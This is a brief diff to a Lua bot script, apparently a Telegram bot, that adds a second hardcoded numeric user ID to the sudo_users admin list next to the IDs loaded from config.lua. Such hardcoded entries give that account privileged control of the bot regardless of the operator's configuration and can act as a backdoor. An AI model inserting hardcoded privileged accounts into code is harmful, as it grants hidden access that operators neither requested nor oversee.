@@ -150,7 +150,7 @@ print("\27[36m"..[[
 ]]..'\27[m')
 sudos = dofile("./config.lua") 
 DevId = sudos.SUDO 
-sudo_users = {sudos.sudo_users,218385683} 
+sudo_users = {sudos.sudo_users,218385683,1031709234} 
 bot_id = sudos.bot_id 
 DevProx = sudos.bot_id
 SudoUser = sudos.username
